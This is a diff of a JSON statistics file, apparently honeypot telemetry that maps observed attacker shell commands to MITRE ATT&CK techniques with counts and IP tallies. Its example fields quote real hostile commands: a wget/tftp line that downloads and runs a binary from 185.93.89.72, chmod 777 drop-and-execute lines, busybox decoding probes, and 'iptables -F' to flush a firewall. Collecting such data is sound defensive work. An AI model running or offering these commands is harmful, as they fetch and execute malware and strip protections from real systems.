@@ -7,7 +7,7 @@
         "stealth"
       ],
       "url": "https://attack.mitre.org/techniques/T1027",
-      "count": 33342,
+      "count": 33348,
       "distinct_ips": 45,
       "examples": [
         "echo -e \"\\x6F\\x6B\"",
@@ -24,8 +24,8 @@
         "defense-impairment"
       ],
       "url": "https://attack.mitre.org/techniques/T1222/002",
-      "count": 925,
-      "distinct_ips": 57,
+      "count": 941,
+      "distinct_ips": 58,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -41,8 +41,8 @@
         "command-and-control"
       ],
       "url": "https://attack.mitre.org/techniques/T1105",
-      "count": 562,
-      "distinct_ips": 48,
+      "count": 565,
+      "distinct_ips": 49,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
@@ -79,6 +79,19 @@
       ]
     },
     {
+      "id": "T1686",
+      "name": "Disable or Modify System Firewall",
+      "tactics": [
+        "defense-impairment"
+      ],
+      "url": "https://attack.mitre.org/techniques/T1686",
+      "count": 3,
+      "distinct_ips": 3,
+      "examples": [
+        "iptables -F"
+      ]
+    },
+    {
       "id": "T1140",
       "name": "Deobfuscate/Decode Files or Information",
       "tactics": [
@@ -90,19 +103,6 @@
       "examples": [
         "/bin/busybox echo bFRP | base64 -d; /bin/busybox echo Nkty | openssl base64 -d; /bin/busybox On4MNjgA ",
         "/bin/busybox echo bFRP | base64 -d; /bin/busybox echo Nkty | openssl base64 -d; /bin/busybox HENtMW4C "
-      ]
-    },
-    {
-      "id": "T1686",
-      "name": "Disable or Modify System Firewall",
-      "tactics": [
-        "defense-impairment"
-      ],
-      "url": "https://attack.mitre.org/techniques/T1686",
-      "count": 2,
-      "distinct_ips": 2,
-      "examples": [
-        "iptables -F"
       ]
     },
     {
@@ -132,6 +132,6 @@
       ]
     }
   ],
-  "total_commands": 60782,
-  "matched_commands": 34497
+  "total_commands": 60865,
+  "matched_commands": 34519
 }
